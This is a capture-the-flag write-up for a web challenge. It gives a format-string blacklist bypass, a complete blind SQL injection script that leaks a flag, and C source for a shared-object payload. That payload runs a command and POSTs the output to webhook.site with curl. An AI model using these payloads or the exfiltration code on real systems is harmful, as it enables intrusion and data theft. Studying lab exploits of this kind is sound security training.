---
created: 2025-01-12T11:00
updated: 2025-01-12T20:04
solves: 33
points: 460
---

After some testing I discovered the world of python format string attacks.

```python
username = "{password.__init__}"
password = "hi"

SELECT * FROM users WHERE username = '<method-wrapper '__init__' of str object at 0x00007FF90538C3B8>' AND password = 'hi'
```

Soon I found out how to bypass the blacklist entirely.

```python
MALICIOUS_CHARS = ['"', "'", "\\", "/", "*", "+" "%", "-", ";", "#", "(", ")", " ", ","]

username = "{A}' OR 1=1 -- '"
for i, c in enumerate(MALICIOUS_CHARS):
    username = username.replace(c, "{A.MALICIOUS_CHARS[%d]}" % i)

r = requests.post("https://prepared-1-0226d7f72e5495ee.chal.uoftctf.org/", data={
    "username": username,
    "password": "w"
})
print(r.text)
```

However the server does not reply with anything, so simply logging in isn't helpful.

```python
user = cursor.fetchone()
if user:
	flash("Login successful!", 'success')
	return render_template('under_construction.html')
else:
	flash("Login Failed\n"+sanitized_query, 'error')
```

I tried leaking the credentials in global but they are just the default credentials.

## Part 1: SQL '%' operation

Then I implemented a char-by-char attack by using SQL's `%` wild card.

Login success only happens if the last char is correctly guessed.

```python
import string
import asyncio
import aiohttp
from tqdm.asyncio import tqdm
MALICIOUS_CHARS = ['"', "'", "\\", "/", "*", "+" "%", "-", ";", "#", "(", ")", " ", ","]

# UNION SELECT NULL, NULL, flag FROM flags --
target = "https://prepared-1-0226d7f72e5495ee.chal.uoftctf.org/"
# target = "http://localhost:5000/"


async def check_flag(session, flag):
    username = "{A}' OR EXISTS (SELECT 1 FROM flags WHERE flag LIKE CONCAT(UNHEX('"+flag.encode().hex()+"'), '%')) #"
    for i, c in enumerate(MALICIOUS_CHARS):
        username = username.replace(c, "{A.MALICIOUS_CHARS[%d]}" % i)

    async with session.post(target, data={
        "username": username,
        "password": "w"
    }) as response:
        text = await response.text()
        return flag if "Login successful!" in text else None


async def check(flag):
    async with aiohttp.ClientSession() as session:
        tasks = []
        for c in string.printable:
            if c == '%':
                c = '\\%'
            if c == '_':
                c = '\\_'
            tasks.append(check_flag(session, flag + c))

        results = []
        for task in tqdm(asyncio.as_completed(tasks), total=len(tasks)):
            results.append(await task)
        for result in results:
            if result:
                return result
    return None


async def main():
    flag = "uoftctf"
    while True:
        flag = await check(flag)
        if flag is None:
            break
        print(flag)
        if flag[-1] == '}':
            break
    print(flag.replace('\\', ''))

asyncio.run(main())
```

### part 1 flag

```flag
uoftctf{R3M3Mb3R_70_c173_Y0uR_50URc35_1N_5qL_F0RM47}
```

## Part 2

- SQL's `into outfile` does not work on pre-existing files.
- Template injection was not able to call any functions.
- `cdll[/readflag]` fails due to it not being position independent.

My closest attempt was writing a binary via SQL then trying to load it.

```python
import base64
import re
import requests
import html
import os
target = "http://localhost:5000/"


MALICIOUS_CHARS = ['"', "'", "\\", "/", "*", "+" "%", "-", ";", "#", "(", ")", " ", ","]
with open("exploit.so", "rb") as f:
    payload = base64.b64encode(f.read()).decode('utf-8')

# username = "{B}' UNION (SELECT FROM_BASE64('"+payload+"'),NULL,NULL) INTO OUTFILE '/run/mysqld/payload.so' # -- "
username = """{B}{{A}}' {{A.__init__.__globals__[setuptools].windows_support.ctypes.cdll[/run/mysqld/payload.so]}}"""
for i, c in enumerate(MALICIOUS_CHARS):
    username = username.replace(c, "{B.MALICIOUS_CHARS[%d]}" % i)
# print(username)
response = requests.post(target, data={
    "username": username,
    "password": "w"
})

decoded_response = response.content.decode('utf-8')
decoded_response = html.unescape(decoded_response)
print(decoded_response)

```

This is the source of `payload.so`.

```c
#include <stdio.h>
#include <stdlib.h>

__attribute__((constructor)) void on_load() {
    FILE *fp;
    char buffer[128];
    char curlCommand[256];
    const char *url = "https://webhook.site/";
    fp = popen("/readflag", "r");
    if (fp == NULL) {
        perror("popen failed");
        return;
    }
    if (fgets(buffer, sizeof(buffer), fp) != NULL) {
        snprintf(curlCommand, sizeof(curlCommand), "curl -X POST -d \"flag=%s\" %s", buffer, url);
        system(curlCommand);
    }
    pclose(fp);
}
```

It works locally (via python script).

```python
import ctypes
ctypes.cdll['./exploit.so']
```

But for some reason, never on the docker or remote.

The file is there, but I get error of `file not found` when trying to execute it with format string payload.

![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1736726181/2025/01/df944d01f0a33f1134a02a51267e84a4.png)

After the CTF ended, I realised that I was really close.

All I had to do was switch `OUTFILE` to `DUMPFILE`.

And my solution will work.

![200w.gif](https://res.cloudinary.com/kumonochisanaka/image/upload/v1736727242/2025/01/cdd29fbe6702a911d79e99121cf3bb62.gif)
